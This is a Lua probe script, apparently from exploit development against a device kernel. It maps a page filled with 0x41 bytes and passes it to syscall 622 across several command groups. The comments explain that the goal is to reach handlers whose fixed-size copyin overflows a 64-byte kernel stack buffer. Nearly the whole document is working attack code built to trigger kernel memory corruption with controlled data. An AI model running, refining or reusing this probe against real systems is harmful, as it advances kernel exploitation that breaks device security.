-- CRASH_CLASS: MODERATE
-- PROBE 243a: 622 with a non-null arg3, filled correctly this time
--
-- Context: 242a's section C printed its header and then nothing, which looked
-- like a kernel death. The loader answered a PING afterwards, so the process
-- survived: the script died in its own fill loop, because `page + i * 8`
-- mixes a uint64 with a number and the loader's uint64 arithmetic rejects it.
-- The 0x400 and 0x302 groups therefore have never been called with a non-null
-- arg3 and a readable page. This probe does exactly that, with every address
-- computed as a uint64 and every risky step inside pcall, so a Lua error is
-- reported instead of truncating the run.
--
-- Why it matters: the 13.60 analysis says most dispatch targets copyin from
-- r13 (arg3) with a size taken from r12 (arg4, capped at 0x40) into a 64-byte
-- stack buffer, but that several sub-handlers use hardcoded copy sizes (0x18,
-- 0x19, 0x30, 0x150) independent of arg4. A 0x150-byte copyin into a 64-byte
-- buffer is a kernel stack overflow, and the observable would be the process
-- dying on the first call that reaches that path - which is what 241a saw at
-- cmd 0x302 before the script bug was understood.

print("=== PROBE 243a: 622 WITH ARG3 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(val)
    if val == nil then return "nil" end
    local text = tostring(val)
    if text == "-1" then return "-1" end
    local ok, h, l = pcall(function() return val.h, val.l end)
    if ok and type(h) == "number" and type(l) == "number" then
        local low = l % 0x100000000
        if low == 0xFFFFFFFF and (h % 0x100000000) == 0xFFFFFFFF then return "-1" end
        return string.format("0x%X_%08X", h % 0x100000000, low)
    end
    if type(val) == "number" then
        if val < 0 then return tostring(val) end
        return string.format("0x%X", val)
    end
    return text
end

print(string.format("PID: %d", to_num(make_syscall(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local sc622 = make_syscall(622)
local sc477 = make_syscall(477)
local buf = memory.alloc(0x200)

local page = sc477(uint64(0), uint64(0x4000), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local ph, pl = get_hi_lo(page)
local page_valid = not (ph == 0xFFFFFFFF and pl == 0xFFFFFFFF) and pl ~= 0
print(string.format("page=%s valid=%s", sgn(page), tostring(page_valid)))

-- fill the page with 0x41 using uint64 arithmetic only
local filled = 0
if page_valid then
    for i = 0, 0x3FF do
        local ok = pcall(function() memory.write_qword(page + uint64(i * 8), uint64(0x4141414141414141)) end)
        if ok then filled = filled + 1 else break end
    end
end
print(string.format("page qwords filled: %d (0x%X)", filled, filled * 8))
local first = nil
if page_valid then
    local ok, v = pcall(function() return memory.read_qword(page) end)
    if ok then first = sgn(v) end
end
print(string.format("page[0] reads back as %s", tostring(first)))

local function call622(cmd, sub, size, use_page)
    for i = 0, 0x1F do safe_wd(buf + i * 4, 0xDEADBEEF) end
    local addr = uint64(0)
    if use_page and page_valid then addr = page end
    local ok, ret = pcall(function()
        return sc622(uint64(cmd), uint64(sub), uint64(buf), addr, uint64(size), uint64(0))
    end)
    return (ok and sgn(ret) or "PCALL-FAIL"), sgn(safe_rd(buf)), sgn(safe_rd(buf + 4)), sgn(safe_rd(buf + 8))
end

-- ============================================================
-- [A] the 0x400 group with a readable page, ascending order
-- ============================================================
print("")
print("[A] cmd 0x400 group, arg3 = 0x41 page, size 0x40")
for _, cmd in ipairs({ 0x400, 0x401, 0x402, 0x410, 0x420, 0x450, 0x480, 0x493 }) do
    local ret, d0, d1, d2 = call622(cmd, 0, 0x40, true)
    print(string.format("  cmd=0x%-4X ret=%-22s buf[0]=%-22s buf[4]=%-22s buf[8]=%s", cmd, ret, d0, d1, d2))
end

-- ============================================================
-- [B] the 0x302 group
-- ============================================================
print("")
print("[B] cmd 0x302 group, arg3 = 0x41 page, size 0x40")
for _, cmd in ipairs({ 0x302, 0x303, 0x310, 0x320 }) do
    local ret, d0, d1, d2 = call622(cmd, 0, 0x40, true)
    print(string.format("  cmd=0x%-4X ret=%-22s buf[0]=%-22s buf[4]=%-22s buf[8]=%s", cmd, ret, d0, d1, d2))
end

-- ============================================================
-- [C] 0x813, the path that validates arg3 and arg4 independently
-- ============================================================
print("")
print("[C] cmd 0x813, arg3 shapes")
for _, size in ipairs({ 0x40, 0x41 }) do
    local ret, d0, d1, d2 = call622(0x813, 0, size, true)
    print(string.format("  size=0x%-4X ret=%-22s buf[0]=%-22s buf[4]=%-22s buf[8]=%s", size, ret, d0, d1, d2))
end
local ret, d0, d1, d2 = call622(0x813, 0, 0x40, false)
print(string.format("  arg3=null  ret=%-22s buf[0]=%-22s buf[4]=%-22s buf[8]=%s", ret, d0, d1, d2))

print("")
print("=== PROBE 243a COMPLETE ===")
